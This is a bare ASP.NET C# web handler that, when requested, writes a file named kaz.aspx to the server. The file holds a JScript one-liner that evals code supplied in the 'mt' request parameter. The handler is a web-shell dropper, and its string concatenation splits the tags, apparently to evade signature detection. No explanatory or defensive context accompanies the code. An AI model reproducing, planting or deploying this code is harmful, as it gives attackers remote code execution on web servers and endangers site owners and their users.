kaz.aspx
<%@ WebHandler Language="C#" Class="Handler" %> 
using System; 
using System.Web; 
using System.IO; 
public class Handler : IHttpHandler { 
    public void ProcessRequest (HttpContext context) { 
        context.Response.ContentType = "text/plain";
string show="Mantodkaz<% @Page Language=\"Jscript\"%"+"><%Response.Write(eval(Request.Item"+"[\"mt\"]"+",\"unsafe\"));%>";
        StreamWriter file1= File.CreateText(context.Server.MapPath("kaz.aspx")); 
        file1.Write(show); 
        file1.Flush(); 
        file1.Close();          
    }
    public bool IsReusable { 
        get { 
            return false; 
        } 
    } 
}
